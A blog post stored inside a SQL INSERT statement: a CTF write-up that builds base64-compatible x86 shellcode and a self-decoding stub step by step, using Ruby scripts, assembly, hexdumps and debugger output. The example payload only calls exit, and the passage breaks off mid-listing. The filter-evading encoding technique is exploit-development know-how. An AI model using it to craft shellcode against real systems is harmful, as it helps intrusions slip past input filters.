INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'Solving b-64-b-tuff: writing base64 and alphanumeric shellcode', 'Ron Bowes', '2017-6-13', 'Hey everybody,\nA couple months ago, we ran BSides San Francisco CTF. It was fun, and I posted blogs about it at the time, but I wanted to do a late writeup for the level b-64-b-tuff.\nThe challenge was to write base64-compatible shellcode. There\'s an easy solution - using an alphanumeric encoder - but what\'s the fun in that? (also, I didn\'t think of it :) ). I\'m going to cover base64, but these exact same principles apply to alphanumeric - there\'s absolutely on reason you couldn\'t change the SET variable in my examples and generate alphanumeric shellcode.\nIn this post, we\'re going to write a base64 decoder stub by hand, which encodes some super simple shellcode. I\'ll also post a link to a tool I wrote to automate this.\nI can\'t promise that this is the best, or the easiest, or even a sane way to do this. I came up with this process all by myself, but I have to imagine that the generally available encoders do basically the same thing. :)\n\nIntro to Shellcode\nI don\'t want to dwell too much on the basics, so I highly recommend reading PRIMER.md, which is a primer on assembly code and shellcode that I recently wrote for a workshop I taught.\nThe idea behind the challenge is that you send the server arbitrary binary data. That data would be encoded into base64, then the base64 string was run as if it were machine code. That means that your machine code had to be made up of characters in the set [a-zA-Z0-9+/]. You could also have an equal sign (\"=\") or two on the end, but that\'s not really useful.\nWe\'re going to mostly focus on how to write base64-compatible shellcode, then bring it back to the challenge at the very end.\nAssembly instructions\nSince each assembly instruction has a 1:1 relationship to the machine code it generates, it\'d be helpful to us to get a list of all instructions we have available that stay within the base64 character set.\nTo get an idea of which instructions are available, I wrote a quick Ruby script that would attempt to disassemble every possible combination of two characters followed by some static data.\nI originally did this by scripting out to ndisasm on the commandline, a tool that we\'ll see used throughout this blog, but I didn\'t keep that code. Instead, I\'m going to use the Crabstone Disassembler, which is Ruby bindings for Capstone:\n\r\nrequire \'crabstone\'\r\n\r\n# Our set of known characters\r\nSET = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\';\r\n\r\n# Create an instance of the Crabstone Disassembler for 32-bit x86\r\ncs = Crabstone::Disassembler.new(Crabstone::ARCH_X86, Crabstone::MODE_32)\r\n\r\n# Get every 2-character combination\r\nSET.chars.each do |c1|\r\n  SET.chars.each do |c2|\r\n    # Pad it out pretty far with obvious no-op-ish instructions\r\n    data = c1 + c2 + (\"A\" * 14)\r\n\r\n    # Disassemble it and get the first instruction (we only care about the\r\n    # shortest instructions we can form)\r\n    instruction = cs.disasm(data, 0)[0]\r\n\r\n    puts \"%s     %s %s\" % [\r\n      instruction.bytes.map() { |b| \'%02x\' % b }.join(\' \'),\r\n      instruction.mnemonic.to_s,\r\n      instruction.op_str.to_s\r\n    ]\r\n  end\r\nend\r\n\nI\'d probably do it considerably more tersely in irb if I was actually solving a challenge rather than writing a blog, but you get the idea. :)\nAnyway, running that produces quite a lot of output. We can feed it through sort + uniq to get a much shorter version.\nFrom there, I manually went through the full 2000+ element list to figure out what might actually be useful (since the vast majority were basically identical, that\'s easier than it sounds). I moved all the good stuff to the top and got rid of the stuff that\'s useless for writing a decoder stub. That left me with this list. I left in a bunch of stuff (like multiply instructions) that probably wouldn\'t be useful, but that I didn\'t want to completely discount.\nDealing with a limited character set\nWhen you write shellcode, there are a few things you have to do. At a minimum, you almost always have to change registers to fairly arbitrary values (like a command to execute, a file to read/write, etc) and make syscalls (\"int 0x80\" in assembly or \"\\xcd\\x80\" in machine code; we\'ll see how that winds up being the most problematic piece!).\nFor the purposes of this blog, we\'re going to have 12 bytes of shellcode: a simple call to the sys_exit() syscall, with a return code of 0x41414141. The reason is, it demonstrates all the fundamental concepts (setting variables and making syscalls), and is easy to verify as correct using strace\nHere\'s the shellcode we\'re going to be working with:\n\r\nmov eax, 0x01 ; Syscall 1 = sys_exit\r\nmov ebx, 0x41414141 ; First (and only) parameter: the exit code\r\nint 0x80\r\n\nWe\'ll be using this code throughout, so make sure you have a pretty good grasp of it! It assembles to (on Ubuntu, if this fails, try apt-get install nasm):\n\r\n$ echo -e \'bits 32\\n\\nmov eax, 0x01\\nmov ebx, 0x41414141\\nint 0x80\\n\' > file.asm; nasm -o file file.asm\r\n$ hexdump -C file\r\n00000000  b8 01 00 00 00 bb 41 41  41 41 cd 80              |............|\r\n\nIf you want to try running it, you can use my run_raw_code.c utility (there are plenty just like it):\n\r\n$ strace ./run_raw_code file\r\n[...]\r\nread(3, \"\\270\\1\\0\\0\\0\\273AAAA\\315\\200\", 12) = 12\r\nexit(1094795585)                        = ?\r\n\nThe read() call is where the run_raw_code stub is reading the shellcode file. The 1094795585 in exit() is the 0x41414141 that we gave it. We\'re going to see that value again and again and again, as we evaluate the correctness of our code, so get used to it!\nYou can also prove that it disassembles properly, and see what each line becomes using the ndisasm utility (this is part of the nasm package):\n\r\n$ ndisasm -b32 file\r\n00000000  B801000000        mov eax,0x1\r\n00000005  BB41414141        mov ebx,0x41414141\r\n0000000A  CD80              int 0x80\r\n\nEasy stuff: NUL byte restrictions\nLet\'s take a quick look at a simple character restriction: NUL bytes. It\'s commonly seen because NUL bytes represent string terminators. Functions like strcpy() stop copying when they reach a NUL. Unlike base64, this can be done by hand!\nIt\'s usually pretty straight forward to get rid of NUL bytes by just looking at where they appear and fixing them; it\'s almost always the case that it\'s caused by 32-bit moves or values, so we can just switch to 8-bit moves (using eax is 32 bits; using al, the last byte of eax, is 8 bits):\n\r\nxor eax, eax ; Set eax to 0\r\ninc eax ; Increment eax (set it to 1) - could also use \"mov al, 1\", but that\'s one byte longer\r\nmov ebx, 0x41414141 ; Set ebx to the usual value, no NUL bytes here\r\nint 0x80 ; Perform the syscall\r\n\nWe can prove this works, as well (I\'m going to stop showing the echo as code gets more complex, but I use file.asm throughout):\n\r\n$ echo -e \'bits 32\\n\\nxor eax, eax\\ninc eax\\nmov ebx, 0x41414141\\nint 0x80\\n\'> file.asm; nasm -o file file.asm\r\n$ hexdump -C file\r\n00000000  31 c0 40 bb 41 41 41 41  cd 80                    |1.@.AAAA..|\r\n\nSimple!\nClearing eax in base64\nSomething else to note: our shellcode is now largely base64! Let\'s look at the disassembled version so we can see where the problems are:\n\r\n$ ndisasm -b32 file                               65 [11:16:34]\r\n00000000  31C0              xor eax,eax\r\n00000002  40                inc eax\r\n00000003  BB41414141        mov ebx,0x41414141\r\n00000008  CD80              int 0x80\r\n\nOkay, maybe we aren\'t so close: the only line that\'s actually compatible is \"inc eax\". I guess we can start the long journey!\nLet\'s start by looking at how we can clear eax using our instruction set. We have a few promising instructions for changing eax, but these are the ones I like best:\n\n35 ?? ?? ?? ??        xor eax,0x????????\n68 ?? ?? ?? ??        push dword 0x????????\n58                pop eax\n\nLet\'s start with the most naive approach:\n\r\npush 0\r\npop eax\r\n\nIf we assemble that, we get:\n\r\n00000000  6A00              push byte +0x0\r\n00000002  58                pop eax\r\n\nClose! But because we\'re pushing 0, we end up with a NUL byte. So let\'s push something else:\n\r\npush 0x41414141\r\npop eax\r\n\nIf we look at how that assembles, we get:\n\r\n00000000  68 41 41 41 41 58                                 |hAAAAX|\r\n\nNot only is it all Base64 compatible now, it also spells \"hAAAAX\", which is a fun coincidence. :)\nThe problem is, eax doesn\'t end up as 0, it\'s 0x41414141. You can verify this by adding \"int 3\" at the bottom, dumping a corefile, and loading it in gdb (feel free to use this trick throughout if you\'re following along, I\'m using it constantly to verify my code snippings, but I\'ll only show it when the values are important):\n\r\n$ ulimit -c unlimited\r\n$ rm core\r\n$ cat file.asm\r\nbits 32\r\n\r\npush 0x41414141\r\npop eax\r\nint 3\r\n$ nasm -o file file.asm\r\n$ ./run_raw_code ./file\r\nallocated 8 bytes of executable memory at: 0x41410000\r\nfish: “./run_raw_code ./file” terminated by signal SIGTRAP (Trace or breakpoint trap)\r\n$ gdb ./run_raw_code ./core\r\nCore was generated by `./run_raw_code ./file`.\r\nProgram terminated with signal SIGTRAP, Trace/breakpoint trap.\r\n#0  0x41410008 in ?? ()\r\n(gdb) print/x $eax\r\n$1 = 0x41414141\r\n\nAnyway, if we don\'t like the value, we can xor a value with eax, provided that the value is also base64-compatible! So let\'s do that:\n\r\npush 0x41414141\r\npop eax\r\nxor eax, 0x41414141\r\n\nWhich assembles to:\n00000000  68 41 41 41 41 58 35 41  41 41 41                 |hAAAAX5AAAA|\nAll right! You can verify using the debugger that, at the end, eax is, indeed, 0.\nEncoding an arbitrary value in eax\nIf we can set eax to 0, does that mean we can set it to anything?\nSince xor works at the byte level, the better question is: can you xor two base-64-compatible bytes together, and wind up with any byte?\nTurns out, the answer is no. Not quite. Let\'s look at why!\nWe\'ll start by trying a pure bruteforce (this code is essentially from my solution):\n\r\nSET = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\';\r\ndef find_bytes(b)\r\n  SET.bytes.each do |b1|\r\n    SET.bytes.each do |b2|\r\n      if((b1 ^ b2) == b)\r\n        return [b1, b2]\r\n      end\r\n    end\r\n  end\r\n  puts(\"Error: Couldn\'t encode 0x%02x!\" % b)\r\n  return nil\r\nend\r\n\r\n0.upto(255) do |i|\r\n  puts(\"%x => %s\" % [i, find_bytes(i)])\r\nend\r\n\nThe full output is here, but the summary is:\n\r\n0 => [65, 65]\r\n1 => [66, 67]\r\n2 => [65, 67]\r\n3 => [65, 66]\r\n...\r\n7d => [68, 57]\r\n7e => [70, 56]\r\n7f => [70, 57]\r\nError: Couldn\'t encode 0x80!\r\n80 =>\r\nError: Couldn\'t encode 0x81!\r\n81 =>\r\nError: Couldn\'t encode 0x82!\r\n82 =>\r\n...\r\n\nBasically, we can encode any value that doesn\'t have the most-significant bit set (ie, anything under 0x80). That\'s going to be a problem that we\'ll deal with much, much later.\nSince many of our instructions operate on 4-byte values, not 1-byte values, we want to operate in 4-byte chunks. Fortunately, xor is byte-by-byte, so we just need to treat it as four individual bytes:\n\r\ndef get_xor_values_32(desired)\r\n  # Convert the integer into a string (pack()), then into the four bytes\r\n  b1, b2, b3, b4 = [desired].pack(\'N\').bytes()\r\n\r\n  v1 = find_bytes(b1)\r\n  v2 = find_bytes(b2)\r\n  v3 = find_bytes(b3)\r\n  v4 = find_bytes(b4)\r\n\r\n  # Convert both sets of xor values back into integers\r\n  result = [\r\n    [v1[0], v2[0], v3[0], v4[0]].pack(\'cccc\').unpack(\'N\').pop(),\r\n    [v1[1], v2[1], v3[1], v4[1]].pack(\'cccc\').unpack(\'N\').pop(),\r\n  ]\r\n\r\n\r\n  # Note: I comment these out for many of the examples, simply for brevity\r\n  puts \'0x%08x\' % result[0]\r\n  puts \'0x%08x\' % result[1]\r\n  puts(\'----------\')\r\n  puts(\'0x%08x\' % (result[0] ^ result[1]))\r\n  puts()\r\n\r\n  return result\r\nend\r\n\nThis function takes a single 32-bit value and it outputs the two xor values (note that this won\'t work when the most significant bit is set.. stay tuned for that!):\n\r\nirb(main):039:0> get_xor_values_32(0x01020304)\r\n0x42414141\r\n0x43434245\r\n----------\r\n0x01020304\r\n\r\n=> [1111572801, 1128481349]\r\n\r\nirb(main):040:0> get_xor_values_32(0x41414141)\r\n0x6a6a6a6a\r\n0x2b2b2b2b\r\n----------\r\n0x41414141\r\n\r\n=> [1785358954, 724249387]\r\n\nAnd so on.\nSo if we want to set eax to 0x00000001 (for the sys_exit syscall), we can simply feed it into this code and convert it to assembly:\n\r\nget_xor_values_32(0x01)\r\n0x41414142\r\n0x41414143\r\n----------\r\n0x00000001\r\n\r\n=> [1094795586, 1094795587]\r\n\nThen write the shellcode:\n\r\npush 0x41414142\r\npop eax\r\nxor eax, 0x41414143\r\n\nAnd prove to ourselves that it\'s base-64-compatible; I believe in doing this, because every once in awhile an instruction like \"inc eax\" (which becomes \'@\') will slip in when I\'m not paying attention:\n\r\n$ hexdump -C file\r\n00000000  68 42 41 41 41 58 35 43  41 41 41                 |hBAAAX5CAAA|\r\n\nWe\'ll be using that exact pattern a lot - push (value) / pop eax / xor eax, (other value). It\'s the most fundamental building block of this project!\nSetting other registers\nSadly, unless I missed something, there\'s no easy way to set other registers. We can increment or decrement them, and we can pop values off the stack into some of them, but we don\'t have the ability to xor, mov, or anything else useful!\nThere are basically three registers that we have easy access to:\n\n58                pop eax\n59                pop ecx\n5A                pop edx\n\nSo to set ecx to an arbitrary value, we can do it via eax:\n\r\npush 0x41414142\r\npop eax\r\nxor eax, 0x41414143 ; eax -> 1\r\npush eax\r\npop ecx ; ecx -> 1\r\n\nThen verify the base64-ness:\n\r\n$ hexdump -C file\r\n00000000  68 42 41 41 41 58 35 43  41 41 41 50 59           |hBAAAX5CAAAPY|\r\n\nUnfortunately, if we try the same thing with ebx, we hit a non-base64 character:\n\r\n$ hexdump -C file\r\n00000000  68 42 41 41 41 58 35 43  41 41 41 50 5b           |hBAAAX5CAAAP[|\r\n\nNote the \"[\" at the end - that\'s not in our character set! So we\'re pretty much limited to using eax, ecx, and edx for most things.\nBut wait, there\'s more! We do, however, have access to popad. The popad instruction pops the next 8 things off the stack and puts them in all 8 registers. It\'s a bit of a scorched-earth method, though, because it overwrites all registers. We\'re going to use it at the start of our code to zero-out all the registers.\nLet\'s try to convert our exit shellcode from earlier:\n\r\nmov eax, 0x01 ; Syscall 1 = sys_exit\r\nmov ebx, 0x41414141 ; First (and only) parameter: the exit code\r\nint 0x80\r\n\nInto something that\'s base-64 friendly:\n\r\n; We\'ll start by populating the stack with 0x41414141\'s\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\npush 0x41414141\r\n\r\n; Then popad to set all the registers to 0x41414141\r\npopad\r\n\r\n; Then set eax to 1\r\npush 0x41414142\r\npop eax\r\nxor eax, 0x41414143\r\n\r\n; Finally, do our syscall (as usual, we\'re going to ignore the fact that the syscall isn\'t base64 compatible)\r\nint 0x80\r\n\nProve that it uses only base64 characters (except the syscall):\n\r\n$ hexdump -C file\r\n00000000  68 41 41 41 41 68 41 41  41 41 68 41 41 41 41 68  |hAAAAhAAAAhAAAAh|\r\n00000010  41 41 41 41 68 41 41 41  41 68 41 41 41 41 68 41  |AAAAhAAAAhAAAAhA|\r\n00000020  41 41 41 68 41 41 41 41  61 68 42 41 41 41 58 35  |AAAhAAAAahBAAAX5|\r\n00000030  43 41 41 41 cd 80                                 |CAAA..|\r\n\nAnd prove that it still works:\n\r\n$ strace ./run_raw_code ./file\r\n...\r\nread(3, \"hAAAAhAAAAhAAAAhAAAAhAAAAhAAAAhA\"..., 54) = 54\r\nexit(1094795585)                        = ?\r\n\nEncoding the actual code\nYou\'ve probably noticed by now: this is a lot of work. Especially if you want to set each register to a different non-base64-compatible value! You have to encode each value by hand, making sure you set eax last (because it\'s our working register). And what if you need an instruction (like add, or shift) that isn\'t available? Do we just simulate it?\nAs I\'m sure you\'ve noticed, the machine code is just a bunch of bytes. What\'s stopping us from simply encoding the machine code rather than just values?\nLet\'s take our original example of an exit again:\n\r\nmov eax, 0x01 ; Syscall 1 = sys_exit\r\nmov ebx, 0x41414141 ; First (and only) parameter: the exit code\r\nint 0x80\r\n\nBecause \'mov\' assembles to 0xb8XXXXXX, I don\'t want to deal with that yet (the most-significant bit is set). So let\'s change it a bit to keep each byte (besides the syscall) under 0x80:\n\r\n00000000  6A01              push byte +0x1\r\n00000002  58                pop eax\r\n00000003  6841414141        push dword 0x41414141\r\n00000008  5B                pop ebx\r\n\nOr, as a string of bytes:\n\"\\x6a\\x01\\x58\\x68\\x41\\x41\\x41\\x41\\x5b\"\nLet\'s pad that to a multiple of 4 so we can encode in 4-byte chunks (we pad with \'A\', because it\'s as good a character as any):\n\"\\x6a\\x01\\x58\\x68\\x41\\x41\\x41\\x41\\x5b\\x41\\x41\\x41\"\nthen break that string into 4-byte chunks, encoding as little endian (reverse byte order):\n\n6a 01 58 68 -> 0x6858016a\n41 41 41 41 -> 0x41414141\n5b 41 41 41 -> 0x4141415b\n\nThen run each of those values through our get_xor_values_32() function from earlier:\n\r\nirb(main):047:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x6858016a)\r\n0x43614241 ^ 0x2b39432b\r\n\r\nirb(main):048:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x41414141)\r\n0x6a6a6a6a ^ 0x2b2b2b2b\r\n\r\nirb(main):050:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x4141415b)\r\n0x6a6a6a62 ^ 0x2b2b2b39\r\n\nLet\'s start our decoder by simply calculating each of these values in eax, just to prove that they\'re all base64-compatible (note that we are simply discarding the values in this example, we aren\'t doing anything with them quite yet):\n\r\npush 0x43614241\r\npop eax\r\nxor eax, 0x2b39432b ; 0x6858016a\r\n\r\npush 0x6a6a6a6a\r\npop eax\r\nxor eax, 0x2b2b2b2b ; 0x41414141\r\n\r\npush 0x6a6a6a62\r\npop eax\r\nxor eax, 0x2b2b2b39 ; 0x4141415b\r\n\nWhich assembles to:\n\r\n$ hexdump -Cv file\r\n00000000  68 41 42 61 43 58 35 2b  43 39 2b 68 6a 6a 6a 6a  |hABaCX5+C9+hjjjj|\r\n00000010  58 35 2b 2b 2b 2b 68 62  6a 6a 6a 58 35 39 2b 2b  |X5++++hbjjjX59++|\r\n00000020  2b                                                |+|\r\n\nLooking good so far!\nDecoder stub\nOkay, we\'ve proven that we can encode instructions (without the most significant bit set)! Now we actually want to run it!\nBasically: our shellcode is going to start with a decoder, followed by a bunch of encoded bytes. We\'ll also throw some padding in between to make this easier to do by hand. The entire decoder has to be made up of base64-compatible bytes, but the encoded payload (ie, the shellcode) has no restrictions.\nSo now we actually want to alter the shellcode in memory (self-rewriting code!). We need an instruction to do that, so let\'s look back at the list of available instructions! After some searching, I found one that\'s promising:\n\r\n3151??            xor [ecx+0x??],edx\r\n\nThis command xors the 32-bit value at memory address ecx+0x?? with edx. We know we can easily control ecx (push (value) / pop eax / xor (other value) / push eax / pop ecx) and, similarly edx. Since the \"0x??\" value has to also be a base64 character, we\'ll follow our trend and use [ecx+0x41], which gives us:\n\r\n315141            xor [ecx+0x41],edx\r\n\nOnce I found that command, things started coming together! Since I can control eax, ecx, and edx pretty cleanly, that\'s basically the perfect instruction to decode our shellcode in-memory!\nThis is somewhat complex, so let\'s start by looking at the steps involved:\n\nLoad the encoded shellcode (half of the xor pair, ie, the return value from get_xor_values_32()) into a known memory address (in our case, it\'s going to be 0x141 bytes after the start of our code)\nSet ecx to the value that\'s 0x41 bytes before that encoded shellcode (0x100)\nFor each 32-bit pair in the encoded shellcode...\n\nLoad the other half of the xor pair into edx\nDo the xor to alter it in-memory (ie, decode it back to the original, unencoded value)\nIncrement ecx to point at the next value\nRepeat for the full payload\n\n\nRun the newly decoded payload\n\nFor the sake of our sanity, we\'re going to make some assumptions in the code: first, our code is loaded to the address 0x41410000 (which it is, for this challenge). Second, the decoder stub is exactly 0x141 bytes long (we will pad it to get there). Either of these can be easily worked around, but it\'s not necessary to do the extra work in order to grok the decoder concept.\nRecall that for our sys_exit shellcode, the xor pairs we determined were: 0x43614241 ^ 0x2b39432b, 0x6a6a6a6a ^ 0x2b2b2b2b, and 0x6a6a6a62 ^ 0x2b2b2b39.\nHere\'s the code:\n\r\n; Set ecx to 0x41410100 (0x41 bytes less than the start of the encoded data)\r\npush 0x6a6a4241\r\npop eax\r\nxor eax, 0x2b2b4341 ; eax -> 0x41410100\r\npush eax\r\npop ecx ; ecx -> 0x41410100\r\n\r\n; Set edx to the first value in the first xor pair\r\npush 0x43614241\r\npop edx\r\n\r\n; xor it with the second value in the first xor pair (which is at ecx + 0x41)\r\nxor [ecx+0x41], edx\r\n\r\n; Move ecx to the next 32-bit value\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\n\r\n; Set edx to the first value in the second xor pair\r\npush 0x6a6a6a6a\r\npop edx\r\n\r\n; xor + increment ecx again\r\nxor [ecx+0x41], edx\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\n\r\n; Set edx to the first value in the third and final xor pair, and xor it\r\npush 0x6a6a6a62\r\npop edx\r\nxor [ecx+0x41], edx\r\n\r\n; At this point, I assembled the code and counted the bytes; we have exactly 0x30 bytes of code so far. That means to get our encoded shellcode to exactly 0x141 bytes after the start, we need 0x111 bytes of padding (\'A\' translates to inc ecx, so it\'s effectively a no-op because the encoded shellcode doesn\'t care what ecx starts as):\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAA\'\r\n\r\n; Now, the second halves of our xor pairs; this is what gets modified in-place\r\ndd 0x2b39432b\r\ndd 0x2b2b2b2b\r\ndd 0x2b2b2b39\r\n\r\n; And finally, we\'re going to cheat and just do a syscall that\'s non-base64-compatible\r\nint 0x80\r\n\nAll right! Here\'s what it gives us; note that other than the syscall at the end (we\'ll get to that, I promise!), it\'s all base64:\n\r\n$ hexdump -Cv file\r\n00000000  68 41 42 6a 6a 58 35 41  43 2b 2b 50 59 68 41 42  |hABjjX5AC++PYhAB|\r\n00000010  61 43 5a 31 51 41 41 41  41 41 68 6a 6a 6a 6a 5a  |aCZ1QAAAAAhjjjjZ|\r\n00000020  31 51 41 41 41 41 41 68  62 6a 6a 6a 5a 31 51 41  |1QAAAAAhbjjjZ1QA|\r\n00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000070  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000080  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000090  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000a0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000b0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000c0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000d0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000e0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n000000f0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000100  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000110  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000120  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000130  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n00000140  41 2b 43 39 2b 2b 2b 2b  2b 39 2b 2b 2b cd 80     |A+C9+++++9+++..|\r\n\nTo run this, we have to patch run_raw_code.c to load the code to the correct address:\n\r\ndiff --git a/forensics/ximage/solution/run_raw_code.c b/forensics/ximage/solution/run_raw_code.c\r\nindex 9eadd5e..1ad83f1 100644\r\n--- a/forensics/ximage/solution/run_raw_code.c\r\n+++ b/forensics/ximage/solution/run_raw_code.c\r\n@@ -12,7 +12,7 @@ int main(int argc, char *argv[]){\r\n     exit(0);\r\n   }\r\n\r\n-  void * a = mmap(0, statbuf.st_size, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);\r\n+  void * a = mmap(0x41410000, statbuf.st_size, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);\r\n   printf(\"allocated %d bytes of executable memory at: %p\\n\", statbuf.st_size, a);\r\n\r\n   FILE *file = fopen(argv[1], \"rb\");\r\n\nYou\'ll also have to compile it in 32-bit mode:\n\r\n$ gcc -m32 -o run_raw_code run_raw_code.c\r\n\nOnce that\'s done, give \'er a shot:\n\r\n$ strace ~/projects/ctf-2017-release/forensics/ximage/solution/run_raw_code ./file\r\n[...]\r\nread(3, \"hABjjX5AC++PYhABaCZ1QAAAAAhjjjjZ\"..., 335) = 335\r\nexit(1094795585)                        = ?\r\n\nWe did it, team!\nIf we want to actually inspect the code, we can change the very last padding \'A\' into 0xcc (aka, int 3, or a SIGTRAP):\n\r\n$ diff -u file.asm file-trap.asm\r\n--- file.asm    2017-06-11 13:17:57.766651742 -0700\r\n+++ file-trap.asm       2017-06-11 13:17:46.086525100 -0700\r\n@@ -45,7 +45,7 @@\r\n db \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\n db \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\n db \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\n-db \'AAAAAAAAAAAAAAAAA\'\r\n+db \'AAAAAAAAAAAAAAAA\', 0xcc\r\n\r\n ; Now, the second halves of our xor pairs\r\n dd 0x2b39432b\r\n\nAnd run it with corefiles enabled:\n\r\n$ nasm -o file file.asm\r\n$ ulimit -c unlimited\r\n$ ~/projects/ctf-2017-release/forensics/ximage/solution/run_raw_code ./file\r\nallocated 335 bytes of executable memory at: 0x41410000\r\nfish: “~/projects/ctf-2017-release/for...” terminated by signal SIGTRAP (Trace or breakpoint trap)\r\n$ gdb ~/projects/ctf-2017-release/forensics/ximage/solution/run_raw_code ./core\r\nCore was generated by `/home/ron/projects/ctf-2017-release/forensics/ximage/solution/run_raw_code ./fi`.\r\nProgram terminated with signal SIGTRAP, Trace/breakpoint trap.\r\n#0  0x41410141 in ?? ()\r\n(gdb) x/10i $eip\r\n=> 0x41410141:  push   0x1\r\n   0x41410143:  pop    eax\r\n   0x41410144:  push   0x41414141\r\n   0x41410149:  pop    ebx\r\n   0x4141014a:  inc    ecx\r\n   0x4141014b:  inc    ecx\r\n   0x4141014c:  inc    ecx\r\n   0x4141014d:  int    0x80\r\n   0x4141014f:  add    BYTE PTR [eax],al\r\n   0x41410151:  add    BYTE PTR [eax],al\r\n\nAs you can see, our original shellcode is properly decoded! (The inc ecx instructions you\'re seeing is our padding.)\nThe decoder stub and encoded shellcode can be quite easily generated programmatically rather than doing it by hand, which is extremely error prone (it took me 4 tries to get it right - I messed up the start address, I compiled run_raw_code in 64-bit mode, and I got the endianness backwards before I finally got it right, which doesn\'t sound so bad, except that I had to go back and re-write part of this section and re-run most of the commands to get the proper output each time :) ).\nThat pesky most-significant-bit\nSo, I\'ve been avoiding this, because I don\'t think I solved it in a very elegant way. But, my solution works, so I guess that\'s something. :)\nAs usual, we start by looking at our set of available instructions to see what we can use to set the most significant bit (let\'s start calling it the \"MSB\" to save my fingers).\nUnfortunately, the easy stuff can\'t help us; xor can only set it if it\'s already set somewhere, we don\'t have any shift instructions, inc would take forever, and the subtract and multiply instructions could probably work, but it would be tricky.\nLet\'s start with a simple case: can we set edx to 0x80?\nFirst, let\'s set edx to the highest value we can, 0x7F (we choose edx because a) it\'s one of the three registers we can easily pop into; b) eax is our working variable since it\'s the only one we can xor; and c) we don\'t want to change ecx once we start going, since it points to the memory we\'re decoding):\n\r\nirb(main):057:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x0000007F)\r\n0x41414146 ^ 0x41414139\r\n\nUsing those values and our old push / pop / xor pattern, we can set edx to 0x80:\n\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; eax -> 0x7F\r\npush eax\r\npop edx ; edx -> 0x7F\r\n\r\n; Now that edx is 0x7F, we can simply increment it\r\ninc edx ; edx -> 0x80\r\n\nThat works out to:\n\r\n00000000  68 46 41 41 41 58 35 39  41 41 41 50 5a 42        |hFAAAX59AAAPZB|\r\n\nSo far so good! Now we can do our usual xor to set that one bit in our decoded code:\n\r\nxor [ecx+0x41], edx\r\n\nThis sets the MSB of whatever ecx+0x41 (our current instruction) is.\nIf we were decoding a single bit at a time, we\'d be done. Unfortunately, we aren\'t so lucky - we\'re working in 32-bit (4-byte) chunks.\nSetting edx to 0x00008000, 0x00800000, or 0x80000000\nSo how do we set edx to 0x00008000, 0x00800000, or 0x80000000 without having a shift instruction?\nThis is where I introduce a pretty ugly hack. In effect, we use some stack shenanigans to perform a poor-man\'s shift. This won\'t work on most non-x86/x64 systems, because they require a word-aligned stack (I was actually a little surprised it worked on x86, to be honest!).\nLet\'s say we want 0x00008000. Let\'s just look at the code:\n\r\n; Set all registers to 0 so we start with a clean slate, using the popad strategy from earlier (we need a register that\'s reliably 0)\r\npush 0x41414141\r\npop eax\r\nxor eax, 0x41414141\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush 